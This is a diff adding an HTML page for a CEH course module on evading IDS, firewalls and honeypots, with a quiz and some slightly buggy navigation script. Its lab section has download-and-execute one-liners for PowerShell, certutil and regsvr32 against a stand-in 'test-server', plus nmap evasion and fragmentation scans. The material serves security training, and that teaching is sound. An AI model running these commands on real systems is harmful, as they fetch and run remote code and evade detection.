+                    <div class="technique-card evasion">
+                        <h4>🕸️ High-Interaction Honeypots</h4>
+                        <p><strong>Function:</strong> Real systems with monitoring</p>
+                        <p><strong>Resources:</strong> Full operating system required</p>
+                        <p><strong>Risk:</strong> Higher risk but better intelligence</p>
+                        <p><strong>Examples:</strong> Sebek, Honeywall</p>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>🌐 Distributed Honeypots</h4>
+                        <p><strong>Function:</strong> Network of interconnected honeypots</p>
+                        <p><strong>Coverage:</strong> Wider attack surface monitoring</p>
+                        <p><strong>Intelligence:</strong> Coordinated threat analysis</p>
+                        <p><strong>Examples:</strong> HoneyNet Project</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Honeypot Detection Techniques</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>⏱️ Response Time Analysis</h5>
+                            <p>Honeypots often have unusually fast or consistent response times compared to real systems under load.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>📊 Service Fingerprinting</h5>
+                            <p>Analyze service banners and responses for inconsistencies or default configurations.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🌐 Network Topology</h5>
+                            <p>Honeypots may be isolated or have unusual network positioning relative to production systems.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>💾 Resource Utilization</h5>
+                            <p>Check for unrealistic resource usage patterns or lack of normal system activity.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="highlight">
+                    <h4>🚨 Honeypot Evasion Strategies</h4>
+                    <div class="code-snippet">
+# Check for common honeypot indicators
+nmap -sV -O target_ip
+
+# Look for:
+# - Unusual service combinations
+# - Default configurations
+# - Inconsistent OS fingerprints
+# - Too many open ports
+# - Perfect uptime statistics
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="detection-methods">Next: Detection Methods →</button>
+            </div>
+
+            <!-- Detection Methods Section -->
+            <div id="detection-methods" class="module-section">
+                <h2 class="section-title">🔬 Detection Methods</h2>
+
+                <div class="card">
+                    <h3>🔍 Advanced Detection Techniques</h3>
+                    <p>Modern detection methods use machine learning, behavioral analysis, and advanced heuristics to identify evasion attempts and sophisticated attacks that traditional signature-based systems might miss.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card detection">
+                        <h4>🤖 Machine Learning Detection</h4>
+                        <p><strong>Method:</strong> Statistical analysis of network patterns</p>
+                        <p><strong>Capability:</strong> Anomaly detection for unknown attacks</p>
+                        <p><strong>Training:</strong> Requires large datasets</p>
+                        <p><strong>Examples:</strong> Darktrace, Vectra AI</p>
+                    </div>
+                    <div class="technique-card evasion">
+                        <h4>📈 Behavioral Analysis</h4>
+                        <p><strong>Method:</strong> Monitor user and system behavior patterns</p>
+                        <p><strong>Focus:</strong> Identify deviations from normal activity</p>
+                        <p><strong>Strength:</strong> Detects insider threats and APTs</p>
+                        <p><strong>Examples:</strong> Exabeam, Splunk UBA</p>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>🔗 Threat Intelligence Integration</h4>
+                        <p><strong>Method:</strong> Combine multiple intelligence sources</p>
+                        <p><strong>Data:</strong> IOCs, TTPs, threat actor profiles</p>
+                        <p><strong>Correlation:</strong> Real-time threat contextualization</p>
+                        <p><strong>Examples:</strong> MISP, ThreatConnect</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🕵️ Forensic Analysis Techniques</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>💾 Memory Analysis</h5>
+                            <p>Examine system memory for indicators of process injection, rootkits, and fileless malware.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>📊 Network Flow Analysis</h5>
+                            <p>Analyze network metadata and flow patterns to identify suspicious communication.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔍 Timeline Analysis</h5>
+                            <p>Correlate events across multiple systems to reconstruct attack sequences.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🧬 Malware Analysis</h5>
+                            <p>Dynamic and static analysis of malicious code to understand capabilities.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="countermeasures">Next: Countermeasures →</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">🛡️ Countermeasures</h2>
+
+                <div class="card">
+                    <h3>⚔️ Defense Strategies</h3>
+                    <p>Implementing comprehensive countermeasures against evasion techniques requires a multi-layered approach combining technical controls, process improvements, and continuous monitoring capabilities.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card countermeasure">
+                        <h4>🏗️ Defense in Depth</h4>
+                        <p><strong>Strategy:</strong> Multiple overlapping security layers</p>
+                        <p><strong>Components:</strong> Firewalls, IDS/IPS, endpoint protection</p>
+                        <p><strong>Redundancy:</strong> Failure of one layer doesn't compromise security</p>
+                        <p><strong>Coverage:</strong> Network, host, application, and data layers</p>
+                    </div>
+                    <div class="technique-card detection">
+                        <h4>🔄 Zero Trust Architecture</h4>
+                        <p><strong>Principle:</strong> Never trust, always verify</p>
+                        <p><strong>Implementation:</strong> Continuous authentication and authorization</p>
+                        <p><strong>Microsegmentation:</strong> Limit lateral movement</p>
+                        <p><strong>Benefits:</strong> Reduces attack surface and impact</p>
+                    </div>
+                    <div class="technique-card evasion">
+                        <h4>🤖 AI-Enhanced Security</h4>
+                        <p><strong>Capability:</strong> Real-time threat detection and response</p>
+                        <p><strong>Learning:</strong> Adaptive to new attack patterns</p>
+                        <p><strong>Automation:</strong> Rapid incident response</p>
+                        <p><strong>Analysis:</strong> Deep packet inspection and behavior analysis</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔧 Technical Countermeasures</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>🛡️ Enhanced IDS Configuration</h5>
+                            <p>Implement stream reassembly, fragment timeout policies, and overlapping fragment detection.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🌐 Network Segmentation</h5>
+                            <p>Isolate critical systems and implement micro-segmentation to limit attack spread.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>📊 Traffic Analysis</h5>
+                            <p>Monitor for unusual patterns, DGA domains, and covert channel communications.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔍 Endpoint Detection Response</h5>
+                            <p>Deploy EDR solutions to detect process injection, LoLBins abuse, and fileless attacks.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="highlight">
+                    <h4>📋 Best Practices Checklist</h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 15px;">
+                        <div>
+                            <h5>✅ Network Security</h5>
+                            <ul style="margin: 10px 0; padding-left: 25px;">
+                                <li>Enable fragment reassembly</li>
+                                <li>Configure proper timeout values</li>
+                                <li>Monitor encrypted traffic metadata</li>
+                                <li>Implement DGA domain detection</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h5>✅ Endpoint Security</h5>
+                            <ul style="margin: 10px 0; padding-left: 25px;">
+                                <li>Application whitelisting</li>
+                                <li>Process monitoring</li>
+                                <li>Memory protection</li>
+                                <li>Behavioral analysis</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="tools">Next: Tools →</button>
+            </div>
+
+            <!-- Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">🔧 Security Tools</h2>
+
+                <div class="card">
+                    <h3>🛠️ Professional Testing Tools</h3>
+                    <p>Various tools are available for testing and implementing security evasion techniques. Understanding these tools is essential for both offensive security testing and defensive countermeasure development.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card evasion">
+                        <h4>⚔️ Offensive Tools</h4>
+                        <p><strong>Purpose:</strong> Penetration testing and red team operations</p>
+                        <p><strong>Capability:</strong> Evasion technique implementation</p>
+                        <p><strong>Examples:</strong> Metasploit, Cobalt Strike, Empire</p>
+                        <p><strong>Usage:</strong> Authorized testing only</p>
+                    </div>
+                    <div class="technique-card detection">
+                        <h4>🛡️ Defensive Tools</h4>
+                        <p><strong>Purpose:</strong> Detection and response capabilities</p>
+                        <p><strong>Capability:</strong> Monitoring and analysis</p>
+                        <p><strong>Examples:</strong> SIEM, EDR, Network monitors</p>
+                        <p><strong>Focus:</strong> Threat hunting and incident response</p>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>🔍 Analysis Tools</h4>
+                        <p><strong>Purpose:</strong> Forensic investigation and malware analysis</p>
+                        <p><strong>Capability:</strong> Deep inspection and reverse engineering</p>
+                        <p><strong>Examples:</strong> Wireshark, Volatility, IDA Pro</p>
+                        <p><strong>Application:</strong> Incident investigation</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔧 Tool Categories</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>🌐 Network Evasion</h5>
+                            <p><strong>Nmap:</strong> Port scanning with evasion options</p>
+                            <p><strong>Hping3:</strong> Custom packet crafting</p>
+                            <p><strong>Fragroute:</strong> Network traffic fragmentation</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🎭 Payload Encoding</h5>
+                            <p><strong>Metasploit:</strong> Multi-stage payload encoding</p>
+                            <p><strong>Veil:</strong> Antivirus evasion framework</p>
+                            <p><strong>Shellter:</strong> Dynamic shellcode injection</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔍 Traffic Analysis</h5>
+                            <p><strong>Wireshark:</strong> Network protocol analyzer</p>
+                            <p><strong>TCPdump:</strong> Command-line packet analyzer</p>
+                            <p><strong>Zeek:</strong> Network security monitor</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🛡️ Detection Systems</h5>
+                            <p><strong>Snort:</strong> Open-source IDS/IPS</p>
+                            <p><strong>Suricata:</strong> High-performance NSM engine</p>
+                            <p><strong>OSSEC:</strong> Host-based intrusion detection</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="highlight">
+                    <h4>⚠️ Tool Usage Guidelines</h4>
+                    <div class="code-snippet">
+# Example Nmap evasion techniques
+# Fragment packets
+nmap -f target.com
+
+# Decoy scanning
+nmap -D RND:10 target.com
+
+# Timing templates
+nmap -T1 target.com  # Paranoid timing
+nmap -T2 target.com  # Sneaky timing
+
+# Source port specification
+nmap --source-port 53 target.com
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="labs">Next: Labs →</button>
+            </div>
+
+            <!-- Labs Section -->
+            <div id="labs" class="module-section">
+                <h2 class="section-title">🧪 Hands-on Labs</h2>
+
+                <div class="card">
+                    <h3>⚗️ Practical Exercises</h3>
+                    <p>Practice evasion techniques in controlled lab environments to understand both offensive capabilities and defensive detection methods. These labs provide hands-on experience with real-world scenarios.</p>
+                </div>
+
+                <div class="lab-container">
+                    <h4>🥽 Lab 1: IDS Evasion with Fragmentation</h4>
+                    <div class="lab-step">
+                        <h5>Objective</h5>
+                        <p>Learn to evade signature-based detection using packet fragmentation techniques</p>
+                    </div>
+                    <div class="lab-step">
+                        <h5>Setup Requirements</h5>
+                        <p>• Two virtual machines (attacker and target)</p>
+                        <p>• Snort IDS configured on network segment</p>
+                        <p>• Nmap and fragroute tools</p>
+                    </div>
+                    <div class="lab-step">
+                        <h5>Exercise Steps</h5>
+                        <div class="code-snippet">
+# Step 1: Normal scan (detected)
+nmap -sS target_ip
+
+# Step 2: Fragmented scan (evasion attempt)
+nmap -sS -f target_ip
+
+# Step 3: Maximum fragmentation
+nmap -sS -ff target_ip
+
+# Step 4: Review Snort logs
+tail -f /var/log/snort/snort.log
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lab-container">
+                    <h4>🎯 Lab 2: Honeypot Detection</h4>
+                    <div class="lab-step">
+                        <h5>Objective</h5>
+                        <p>Identify honeypot deployments using reconnaissance techniques</p>
+                    </div>
+                    <div class="lab-step">
+                        <h5>Detection Methods</h5>
+                        <div class="code-snippet">
+# Service fingerprinting
+nmap -sV -O target_range
+
+# Response time analysis
+for i in {1..100}; do
+    ping -c 1 target | grep 'time='
+done
+
+# Banner analysis
+nc target_ip 80
+HEAD / HTTP/1.0
+
+# Check for unusual service combinations
+nmap -sT -p- target_ip
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lab-container">
+                    <h4>🤖 Lab 3: Living-off-the-Land Techniques</h4>
+                    <div class="lab-step">
+                        <h5>Objective</h5>
+                        <p>Practice using legitimate system binaries for security testing</p>
+                    </div>
+                    <div class="lab-step">
+                        <h5>Windows LoLBins</h5>
+                        <div class="code-snippet">
+# PowerShell download and execute
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Start-Sleep 1; IEX(New-Object Net.WebClient).DownloadString('http://test-server/script.ps1')}"
+
+# Certutil file download
+certutil -urlcache -split -f http://test-server/file.exe downloaded_file.exe
+
+# WMIC remote execution simulation
+wmic process call create "calc.exe"
+
+# Regsvr32 scriptlet execution
+regsvr32 /u /n /s /i:http://test-server/test.sct scrobj.dll
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📚 Lab Resources</h3>
+                    <div class="resource-links">
+                        <div class="resource-card">
+                            <h4>Virtual Lab Platforms</h4>
+                            <a href="#">VirtualBox</a>
+                            <a href="#">VMware Workstation</a>
+                            <a href="#">Proxmox VE</a>
+                        </div>
+                        <div class="resource-card">
+                            <h4>Vulnerable Systems</h4>
+                            <a href="#">Metasploitable</a>
+                            <a href="#">DVWA</a>
+                            <a href="#">VulnHub VMs</a>
+                        </div>
+                        <div class="resource-card">
+                            <h4>Security Tools</h4>
+                            <a href="#">Kali Linux</a>
+                            <a href="#">Parrot Security</a>
+                            <a href="#">BlackArch</a>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="quiz">Next: Assessment →</button>
+            </div>
+
+            <div id="certification" class="module-section">
+                <h2 class="section-title">🏆 Certification Path</h2>
+                
+                <div class="certification-preview">
+                    <h3>🎓 CEH v13 Module 12 Complete</h3>
+                    <p>Congratulations! You've completed the Evading IDS, Firewalls, and Honeypots module.</p>
+                    <button class="btn" id="generateCert">Generate Certificate</button>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Next Steps</h3>
+                    <ul style="margin: 15px 0; padding-left: 25px; line-height: 1.8;">
+                        <li>Continue to Module 13: Hacking Web Servers</li>
+                        <li>Practice in virtual lab environments</li>
+                        <li>Review and reinforce weak areas</li>
+                        <li>Schedule your CEH certification exam</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div id="quiz" class="module-section">
+                <h2 class="section-title">📝 Knowledge Assessment</h2>
+                
+                <div class="quiz-container">
+                    <div class="question">
+                        <h4>1. Which type of IDS monitors network traffic in real-time?</h4>
+                        <div class="option" data-answer="correct">Network-Based IDS (NIDS)</div>
+                        <div class="option" data-answer="incorrect">Host-Based IDS (HIDS)</div>
+                        <div class="option" data-answer="incorrect">Application-Based IDS</div>
+                        <div class="option" data-answer="incorrect">Database IDS</div>
+                    </div>
+
+                    <div class="question">
+                        <h4>2. What is the primary purpose of packet fragmentation in evasion?</h4>
+                        <div class="option" data-answer="incorrect">Increase packet speed</div>
+                        <div class="option" data-answer="correct">Bypass signature detection</div>
+                        <div class="option" data-answer="incorrect">Reduce network load</div>
+                        <div class="option" data-answer="incorrect">Improve encryption</div>
+                    </div>
+
+                    <button class="btn btn-success" id="submitQuiz">Submit Quiz</button>
+                </div>
+
+                <button class="btn btn-success" data-next="certification">Next: Certification →</button>
+            </div>
+
+            <div id="certification" class="module-section">
+                <h2 class="section-title">🏆 Certification Path</h2>
+                
+                <div class="certification-preview">
+                    <h3>🎓 CEH v13 Module 12 Complete</h3>
+                    <p>Congratulations! You've completed the Evading IDS, Firewalls, and Honeypots module.</p>
+                    <button class="btn" id="generateCert">Generate Certificate</button>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Next Steps</h3>
+                    <ul style="margin: 15px 0; padding-left: 25px; line-height: 1.8;">
+                        <li>Continue to Module 13: Hacking Web Servers</li>
+                        <li>Practice in virtual lab environments</li>
+                        <li>Review and reinforce weak areas</li>
+                        <li>Schedule your CEH certification exam</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Module Navigation System
+        class ModuleNavigator {
+            constructor() {
+                this.sections = [
+                    'overview', 'ids-concepts', 'firewall-basics', 'evasion-techniques',
+                    'modern-evasion', 'honeypots', 'detection-methods', 'countermeasures',
+                    'tools', 'labs', 'quiz'
+                ];
+                this.currentSection = 0;
+                this.completedSections = new Set(['overview']);
+                this.init();
+            }
+
+            init() {
+                this.bindEvents();
+                this.updateProgress();
+            }
+
+            bindEvents() {
+                // Navigation button clicks
+                document.querySelectorAll('.nav-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        const section = e.target.getAttribute('data-section');
+                        this.navigateToSection(section);
+                    });
+                });
+
+                // Next button clicks
+                document.querySelectorAll('[data-next]').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        const nextSection = e.target.getAttribute('data-next');
+                        this.navigateToSection(nextSection);
+                    });
+                });
+
+                // Quiz functionality
+                this.bindQuizEvents();
+
+                // Keyboard navigation
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'ArrowLeft') {
+                        this.navigatePrevious();
+                    } else if (e.key === 'ArrowRight') {
+                        this.navigateNext();
+                    }
+                });
+
+                // Certificate generation
+                const certBtn = document.getElementById('generateCert');
+                if (certBtn) {
+                    certBtn.addEventListener('click', () => this.generateCertificate());
+                }
+            }
+
+            navigateToSection(sectionId) {
+                // Hide all sections
+                document.querySelectorAll('.module-section').forEach(section => {
+                    section.classList.remove('active');
+                });
+
+                // Show target section
+                const targetSection = document.getElementById(sectionId);
+                if (targetSection) {
+                    targetSection.classList.add('active');
+                    
+                    // Update current section index
+                    this.currentSection = this.sections.indexOf(sectionId);
+                    
+                    // Mark as completed
+                    this.completedSections.add(sectionId);
+                    
+                    // Update navigation buttons
+                    this.updateNavButtons();
+                    
+                    // Update progress
+                    this.updateProgress();
+                    
+                    // Smooth scroll to top
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            }
+
+            navigateNext() {
+                if (this.currentSection < this.sections.length - 1) {
+                    const nextSection = this.sections[this.currentSection + 1];
+                    this.navigateToSection(nextSection);
+                }
+            }
+
+            navigatePrevious() {
+                if (this.currentSection > 0) {
+                    const prevSection = this.sections[this.currentSection - 1];
+                    this.navigateToSection(prevSection);
+                }
+            }
+
+            updateNavButtons() {
+                document.querySelectorAll('.nav-btn').forEach(btn => {
+                    btn.classList.remove('active');
+                    const section = btn.getAttribute('data-section');
+                    if (section === this.sections[this.currentSection]) {
+                        btn.classList.add('active');
+                    }
+                });
+            }
+
+            updateProgress() {
+                const progressPercent = Math.round((this.completedSections.size / this.sections.length) * 100);
+                const progressBar = document.getElementById('progressBar');
+                const progressText = document.getElementById('progressText');
+                
+                if (progressBar) {
+                    progressBar.style.width = progressPercent + '%';
+                    progressBar.textContent = progressPercent + '%';
+                }
+                
+                if (progressText) {
+                    progressText.textContent = `Progress: ${progressPercent}% Complete`;
+                }
+            }
+
+            bindQuizEvents() {
+                // Quiz option selection
+                document.querySelectorAll('.option').forEach(option => {
+                    option.addEventListener('click', (e) => {
+                        const question = e.target.closest('.question');
+                        // Remove previous selections
+                        question.querySelectorAll('.option').forEach(opt => {
+                            opt.classList.remove('selected');
+                        });
+                        // Add selection
+                        e.target.classList.add('selected');
+                    });
+                });
+
+                // Quiz submission
+                const submitBtn = document.getElementById('submitQuiz');
+                if (submitBtn) {
+                    submitBtn.addEventListener('click', () => this.submitQuiz());
+                }
+            }
+
+            submitQuiz() {
+                const questions = document.querySelectorAll('.question');
+                let score = 0;
+                let totalQuestions = questions.length;
+
+                questions.forEach(question => {
+                    const selectedOption = question.querySelector('.option.selected');
+                    const correctOption = question.querySelector('.option[data-answer="correct"]');
+                    
+                    if (selectedOption) {
+                        if (selectedOption.getAttribute('data-answer') === 'correct') {
+                            selectedOption.classList.add('correct');
+                            score++;
+                        } else {
+                            selectedOption.classList.add('incorrect');
+                            correctOption.classList.add('correct');
+                        }
+                    } else {
+                        correctOption.classList.add('correct');
+                    }
+                });
+
+                const percentage = Math.round((score / totalQuestions) * 100);
+                alert(`Quiz completed! You scored ${score}/${totalQuestions} (${percentage}%)`);
+                
+                // Mark quiz as completed
+                this.completedSections.add('quiz');
+                this.updateProgress();
+            }
+
+            generateCertificate() {
+                const completionPercentage = Math.round((this.completedSections.size / this.sections.length) * 100);
+                
+                if (completionPercentage >= 80) {
+                    alert('🎉 Certificate Generated!\n\nCongratulations on completing CEH v13 Module 12: Evading IDS, Firewalls, and Honeypots!\n\nYou have successfully demonstrated understanding of advanced security evasion techniques.');
+                } else {
+                    alert(`⚠️ Complete more sections to generate certificate.\n\nCurrent progress: ${completionPercentage}%\nRequired: 80%`);
+                }
+            }
+        }
+
+        // Initialize the application when DOM is loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            new ModuleNavigator();
+            
+            // Add some interactive enhancements
+            this.addInteractiveEnhancements();
+        });
+
+        function addInteractiveEnhancements() {
+            // Add hover effects to cards
+            document.querySelectorAll('.card, .feature-card, .technique-card').forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+
+            // Add click effects to buttons
+            document.querySelectorAll('.btn, .nav-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        this.style.transform = 'scale(1)';
+                    }, 150);
+                });
+            });
+
+            // Add tooltips for navigation shortcuts
+            const shortcuts = document.querySelectorAll('[style*="background: rgba(255,255,255,0.1)"]');
+            shortcuts.forEach(shortcut => {
+                shortcut.title = shortcut.textContent.includes('Navigate') ? 
+                    'Use left/right arrow keys to navigate between sections' : 
+                    'Press Esc to close any open modals';
+            });
+        }
+    </script>
+</body>
+</html>
